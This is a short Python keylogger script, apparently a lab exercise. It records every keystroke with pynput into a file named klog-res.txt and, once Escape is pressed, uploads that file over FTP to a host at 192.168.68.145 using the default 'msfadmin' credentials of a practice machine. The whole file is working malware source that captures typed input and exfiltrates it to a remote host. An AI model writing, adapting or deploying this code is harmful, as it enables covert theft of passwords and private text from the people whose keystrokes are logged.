
from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir+'klog-res.txt'), level=logging.DEBUG, format='%(asctime)s:%(message)s')

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print('A special key {0} has been pressed.'.format(key))


def releasing_key(key):
    if key ==Key.esc:
        return False


print('\n Starting listening...\n')

with Listener(on_press=pressing_key, on_release=releasing_key) as Listener:
    Listener.join()


print('\n Connecting toFTP and sending the data...')

# ----------------volnurable machine IP, username, password
ftp_session = ftplib.FTP('192.168.68.145', 'msfadmin', 'msfadmin')

file = open('klog-res.txt', 'rb')
ftp_session.storbinary('STOR klog-res.txt', file)
file.close()
ftp_session.quit()


